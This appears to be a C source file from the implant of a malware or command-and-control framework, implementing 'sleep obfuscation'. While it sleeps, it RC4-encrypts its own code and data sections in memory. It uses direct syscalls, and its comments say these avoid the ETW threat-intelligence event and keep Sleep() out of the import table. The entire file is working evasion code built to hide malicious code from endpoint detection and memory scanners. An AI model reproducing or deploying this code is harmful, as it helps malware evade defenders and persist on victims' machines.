/*
 * client/evasion/sleep_obf.c  –  Sleep obfuscation implementation
 * ================================================================
 * See sleep_obf.h for design documentation.
 *
 * Build note
 * ----------
 * Compiled as a separate translation unit.  The encrypt/decrypt helper
 * (_so_xor_image) is placed in section ".slpobf" so it is excluded from
 * the region being ciphered.  The main module sections (.text, .data,
 * .rdata) are the ones XOR'd.
 */

#include "sleep_obf.h"
#include "obf.h"
#include "k32_walk.h"

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <windows.h>
#include <winternl.h>
#include <bcrypt.h>
#include <stddef.h>
#include <string.h>

/* g_peb_hash_seed is the RDTSC-seeded value initialised by peb_hash_str() */
extern DWORD g_peb_hash_seed;


/* ── Section marker ─────────────────────────────────────────────────────── */
/*
 * Functions placed in .slpobf are excluded from the XOR pass.
 * We match section names that do NOT start with ".slpobf" in _so_xor_image.
 */
#ifdef __GNUC__
#  define _SLPOBF __attribute__((section(".slpobf"))) __attribute__((noinline))
#else
#  define _SLPOBF /* MSVC: pragma section not portable — keep in .text; small enough */
#endif


/* ── RC4 state (local, stack-only, wiped after each xor pass) ───────────── */
typedef struct { unsigned char s[256]; unsigned int i, j; } _Rc4State;

static _SLPOBF void _rc4_init(_Rc4State *st, const unsigned char *key, size_t klen)
{
    unsigned int i;
    for (i = 0; i < 256; i++) st->s[i] = (unsigned char)i;
    unsigned int j = 0;
    for (i = 0; i < 256; i++) {
        j = (j + st->s[i] + key[i % klen]) & 0xFF;
        unsigned char tmp = st->s[i]; st->s[i] = st->s[j]; st->s[j] = tmp;
    }
    st->i = st->j = 0;
}

static _SLPOBF unsigned char _rc4_byte(_Rc4State *st)
{
    st->i = (st->i + 1) & 0xFF;
    st->j = (st->j + st->s[st->i]) & 0xFF;
    unsigned char tmp = st->s[st->i];
    st->s[st->i] = st->s[st->j];
    st->s[st->j] = tmp;
    return st->s[(st->s[st->i] + st->s[st->j]) & 0xFF];
}


/* ── Key derivation ─────────────────────────────────────────────────────── */
/*
 * 16-byte RC4 key = BCrypt-SHA256( seed32 || base64 || size32 ) truncated.
 * Falls back to a plain XOR spread of the seed if BCrypt fails.
 */
static _SLPOBF void _derive_key(BYTE key[16], DWORD seed,
                                  PVOID base, DWORD imgSize)
{
    BCRYPT_ALG_HANDLE hAlg  = NULL;
    BCRYPT_HASH_HANDLE hHash = NULL;
    BYTE digest[32] = {0};
    ULONG cbResult = 0;

    /* Build input buffer: [seed(4) | base(8) | imgSize(4)] = 16 bytes */
    BYTE input[16] = {0};
    memcpy(input,     &seed,    4);
    memcpy(input + 4, &base,    sizeof(PVOID) < 8 ? sizeof(PVOID) : 8);
    memcpy(input + 12, &imgSize, 4);

    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_SHA256_ALGORITHM, NULL, 0) == 0 &&
        BCryptCreateHash(hAlg, &hHash, NULL, 0, NULL, 0, 0) == 0) {
        BCryptHashData(hHash, input, sizeof(input), 0);
        BCryptFinishHash(hHash, digest, sizeof(digest), 0);
        BCryptDestroyHash(hHash);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        memcpy(key, digest, 16);
        SecureZeroMemory(digest, sizeof(digest));
        return;
    }
    /* Fallback: spread seed across 16 bytes with prime multipliers */
    for (int i = 0; i < 16; i++)
        key[i] = (BYTE)((seed >> (i & 3)) ^ (BYTE)(i * 0x6D + 0x5A));
    (void)cbResult;
}


/* ── _so_xor_image ──────────────────────────────────────────────────────── */
/*
 * XOR-crypt the .text, .data, and .rdata sections of the module at `base`
 * using the provided RC4 key.  Skips the .slpobf section so this function
 * keeps working while the rest of the image is ciphertext.
 *
 * Writes via SC_NtWriteVirtualMemory on the current process handle to avoid
 * the ETW-Ti KERNEL_THREATINT_TASK_PROTECT event that a VirtualProtect flip
 * would generate.
 */
static _SLPOBF void _so_xor_image(PVOID base, const BYTE key[16])
{
    /* Parse PE headers */
    BYTE *bbase = (BYTE *)base;
    DWORD e_lfanew;
    memcpy(&e_lfanew, bbase + 0x3C, 4);
    if (e_lfanew > 0x800) return;

    WORD nSec, optSz;
    memcpy(&nSec,  bbase + e_lfanew + 4 + 2,  2);
    memcpy(&optSz, bbase + e_lfanew + 4 + 16, 2);
    const BYTE *secHdr = bbase + e_lfanew + 4 + 20 + optSz;
    if (nSec > 96) return;

    HANDLE hSelf = GetCurrentProcess();

    for (WORD i = 0; i < nSec; i++) {
        const BYTE *sh = secHdr + (size_t)i * 40;

        /* Section name is 8 bytes, NUL-padded.  Skip .slpobf. */
        char name[9] = {0};
        memcpy(name, sh, 8);
        if (memcmp(name, ".slpobf", 7) == 0) continue;
        /* Only cipher executable or data sections; skip .rsrc, .reloc, .pdata */
        DWORD chars;
        memcpy(&chars, sh + 36, 4);
        BOOL isExec = (chars & 0x20) != 0;       /* IMAGE_SCN_CNT_CODE */
        BOOL isRW   = (chars & 0xC0000000) != 0; /* MEM_READ | MEM_WRITE */
        BOOL isRO   = (chars & 0x40000000) != 0; /* IMAGE_SCN_MEM_READ */
        if (!isExec && !isRW && !isRO) continue;
        if (memcmp(name, ".rsrc",  5) == 0) continue;
        if (memcmp(name, ".reloc", 6) == 0) continue;
        if (memcmp(name, ".pdata", 6) == 0) continue;

        DWORD rva, vsz;
        memcpy(&rva, sh + 12, 4);
        memcpy(&vsz, sh +  8, 4);
        if (!rva || !vsz || vsz > 64 * 1024 * 1024) continue;

        BYTE *target = bbase + rva;

        /* RC4 encrypt in 4 KB chunks to limit stack usage */
#define CHUNK 4096
        _Rc4State rc4;
        _rc4_init(&rc4, key, 16);

        DWORD remaining = vsz;
        BYTE *ptr = target;
        while (remaining > 0) {
            BYTE chunk[CHUNK];
            DWORD n = remaining < CHUNK ? remaining : CHUNK;
            memcpy(chunk, ptr, n);
            for (DWORD k = 0; k < n; k++)
                chunk[k] ^= _rc4_byte(&rc4);
            SIZE_T written = 0;
            SC_NtWriteVirtualMemory(hSelf, ptr, chunk, n, &written);
            ptr += n;
            remaining -= n;
        }
        SecureZeroMemory(&rc4, sizeof(rc4));
#undef CHUNK
    }
}


/* ── sleep_obf_delay ────────────────────────────────────────────────────── */

void sleep_obf_delay(DWORD ms)
{
#ifndef SLEEP_OBF_ENABLE
    jitter_sleep(ms);
    return;
#else
    /* Resolve own module base via PEB */
    void *peb_ptr;
#ifdef _WIN64
    __asm__ __volatile__("movq %%gs:0x60, %0" : "=r"(peb_ptr));
#else
    __asm__ __volatile__("movl %%fs:0x30, %0" : "=r"(peb_ptr));
#endif
    PEB *peb = (PEB *)peb_ptr;
    PVOID base = peb->ImageBaseAddress;

    /* Get image size from optional header */
    BYTE *bbase = (BYTE *)base;
    DWORD e_lfanew;
    memcpy(&e_lfanew, bbase + 0x3C, 4);
    DWORD imgSize = 0;
    if (e_lfanew <= 0x800) {
        /* OptionalHeader.SizeOfImage is at offset +56 from optional header start */
        WORD optMagic;
        memcpy(&optMagic, bbase + e_lfanew + 4 + 20, 2);
        DWORD soi_off = (optMagic == 0x20B) ? (4+20+56) : (4+20+56);
        memcpy(&imgSize, bbase + e_lfanew + soi_off, 4);
    }

    /* Derive RC4 key from per-run RDTSC seed + module base + size */
    BYTE key[16];
    _derive_key(key, g_peb_hash_seed, base, imgSize);

    /* Encrypt */
    _so_xor_image(base, key);

    /* Sleep via direct syscall — keeps Sleep() out of IAT */
    LARGE_INTEGER interval;
    interval.QuadPart = -((LONGLONG)ms * 10000LL);   /* 100-ns units, negative = relative */
    SC_NtDelayExecution(FALSE, &interval);

    /* Decrypt (XOR is self-inverse — same key, same result) */
    _so_xor_image(base, key);

    /* Wipe key from stack */
    SecureZeroMemory(key, sizeof(key));
#endif /* SLEEP_OBF_ENABLE */
}
